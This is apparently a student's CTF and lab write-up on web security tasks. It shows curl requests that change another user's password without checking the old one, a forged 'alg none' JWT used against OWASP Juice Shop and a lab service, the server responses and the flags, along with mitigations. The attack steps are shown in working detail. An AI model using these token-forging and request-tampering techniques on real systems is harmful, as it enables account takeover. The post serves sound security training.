---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2025-01-25-Cryptographic-Fails
tags:
- JWT
- Cryptographic Failures 
title: School Tasks 1 - Web Application Security - Cryptographic Fails
---

## Task 1A - Old Wasdat – Change user’s password by using curl
***Description:*** 

The service accepts manipulated curl-request in order to change the password of specific user via changing the parameters of the original request. Also, the bio section must be
changed, or it will produce an internal server error.

***Vulnerability: CWE-620: Unverified Password Change***

***Steps to reproduce:***

• Create an account for this service and find the profile section, where you can change the password

• Open browser’s developer-tools to capture the traffic in this page.

• In the form change bio and password.

• Therefore, copy the cURL request from the network section for further modification

• As you can see the password in the request is in SHA-1, which is considered a severely vulnerable
encryption method. “SHA-1 is widely considered obsolete due to its well-documented vulnerabilities”, (Harish, Anusha).

• Now modify the request’s, bio and password strings. New password needs to be in SHA-1 format
also.

Here is my request:

````bash 
curl -i 'http://wasdat.fi:8080/api/user' -X PUT -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64;
rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-
Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Authorization: Token eyJ0eX-
AiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQi-
O***********************************************************
**************************************************************pdHkiOjEsImZyZXNoIj
p0cnVlLCJ0eXBlIjoiYWNjZXNzIn0.l8q9iBlXgC09PcuMS2DxIzvcHfpRl4AKc6n-1wsoObI' -H 'Content-
Type: application/json;charset=utf-8' -H 'Origin: http://wasdat.fi:8080' -H 'Connection: keep-alive' -
H 'Referer: http://wasdat.fi:8080/' -H 'Cookie: language=en; welcomebanner_status=dismiss; cook-
ieconsent_status=dismiss; continue-
Code=aj4QDO4KyOqPJ7j2novp9EQ38gYVAJvlAM1wWxalND5reZRLzmXk6BbmzZRb' -H 'Priority: u=0'
--data-raw '{"user":{"email":"wasdat-victim@example.com","username":"victim","bio":"thisneed-
stobechangedalso","image":null,"password":"b9333b50f2beb8aac0f0a65eabd0e0bb3ee5b234"}}'
Bio : thisneedstobechangedalso
Password : JAMK2025 (in SHA-1 format)
````



• This was the response from the website:

![](2025-02-18-15-53-02.png)

• Now make sure that the password was changed by logging in, here is my post request data and the
response:

![](2025-02-18-15-53-46.png)

The response was legit and now it’s confirmed that the payload for the password change worked.

***Impact estimation:***

• High severity: This vulnerability has a significant impact on gaining control of other user’s account,
but I will consider it as high not critical, because attacker need to gain access to this user's authentication token to carry out the successful change. Considering also that password is using weak encryption method.

***Mitigation:***

• Implement a validation for new password change. This would be example a section for previous
password to verify the author of the request or something different authetication method.


## Task 2A: Juice Shop – Exploiting Unsigned JWT


***Description:***

Forge an essentially unsigned JWT token that impersonates the (non-existing) user jwtn3d@juice-sh.op.
“JWT is a way to determine authorization between a user and a web server, without
the web server needing to keep track of sessions.”, (Hacker Bartender, 2021). Another way to au-
thenticate the client with the server.

***Vulnerability:*** Target supports none-algorithm.

***Steps to reproduce:***

• Start Burpsuite in order to capture the traffic between the server and the client

• Use proxy to intercept the traffic of an action while logged in as registered account (I used the password changing section for this

• You can identify the JSON Web Token in the request its in following format:

![](2025-02-18-15-57-29.png)

• Now you can use an optional JWT editor to craft the payload. In this payload you change the algorithm parameter in the header section into “none”. I found out that few editors didn’t accept to do
this, but I was able to craft it with this. (https://www.gavinjl.me/edit-jwt-online-alg-none/)

• Also, for this challenge you need to change from the data section the email address to the impersonators address (jwtn3d@juice-sh.op).

• Here is the crafted data and the payload:

![](2025-02-18-15-58-30.png)

Then this needs to be in Base64 format like in the original request to work, here is my crafted
````bash 
token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0dXMi-
OiJzdWNjZXNz*****************************************IjoiIiwiZW1haWwiOiJqd3RuM2RAan
VpY2Utc2gub3AiL-
CJwYXNzd29yZCI6IjhmMDM2MzY5YTVjZDI2NDU0OTQ5ZTU5NGZiOWUwYTJkIiwicm9sZSI6I
6
mN1*******************************************************jAyNS0wMS0zMSAxOToxNDowNi4yMzEgK
zAwO******************************MS0zMSAxO-
ToxNDowNi4yMzEgKzAwOjAwIiwiZGVsZXRlZEF0Ijpud-
WxsfSwiaWF0IjoxNzM4MzUwODU2fQ.
````
• This will be placed in the authorization and cookie sections

• Then send the request

![](2025-02-18-16-00-03.png)

***Mitigation:***

• Disabling the application accepting “none” as algorithm

• Encrypting the token with more complex method

## Task 2B: Old wasdat – JWT Exploitation

***Steps to reproduce:***

• Start with capturing the network traffic with browser’s developer’s tools (another method is to capture the packet with Burpsuite and then copy the request as “curl-command”, this one I prefer

• Capture the packet from password changing event and copy it into “cURL”

• Here is my captured packet and I modified the algorithm into “none” and my student id into that
````bash
curl -i 'http://wasdat.fi:8080/api/user' -X PUT -H 'Authorization: Token eyJ0eXAiOiJKV1QiLCJhbGci-
O**********************************
*************************************
**********************************NTI3NCwiaWRlbnRpdHkiOjIsImZyZXNoIjp0cnVlLCJ0eX
BlIjoiYWNjZXNzIn0.' -H 'Content-Type: application/json;charset=UTF-8' --data-raw
'{"user":{"email":"attacker@example.com","username":"attacker","bio":"asdasdasdasdasdasdas-
daa","image":null,"password":"b9333b5*******************5b234"}}'
````
• In this packet I used the earlier challenge's SHA-1 password hash and by executing the
command, the flag appeared into the console:
````bash
HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Sun, 02 Feb 2025 14:33:15 GMT
Content-Type: application/json
Content-Length: 162
Connection: keep-alive
Access-Control-Allow-Origin: http://0.0.0.0:4000
Vary: Origin
CurlFlagEarned: WasFlag4_1{PasswordSetWithCurl}
JWTFlagEarned: WasFlag4_2{AlgNoneShouldBeDead}
Access-Control-Allow-Origin: *
{
"user": {
"bio": "asdasdasdasdasdasdasdaa",
"email": "attacker@example.com",
"image": null,
"token": "",
"username": "attacker"
}
}
````
• This also confirms that the password has been changed.


## Sources

Harish, Anusha. SHA-256 vs. SHA-1: Which Is The Better Encryption?. Referenced 31.1.2025

[https://www.securew2.com/blog/what-is-sha-encryption-sha-256-vs-sha-1]

MITRE. CWE-620 - Unverified Password Change. 19.11.2024. Referenced 31.1.2025

[https://cwe.mitre.org/data/definitions/620.html]

Hacker Bartender. OWASP Juice Shop – Unsigned JWT. 2.10.2021. Referenced 31.1.2025

[https://www.hackerbartender.com/unsigned-jwt/]

Github. Whyiest – Juice Shop Write-up. 31.3.2024. Referenced 31.1.2025

[https://github.com/Whyiest/Juice-Shop-Write-up/blob/main/5-stars/unsigned_jwt.md]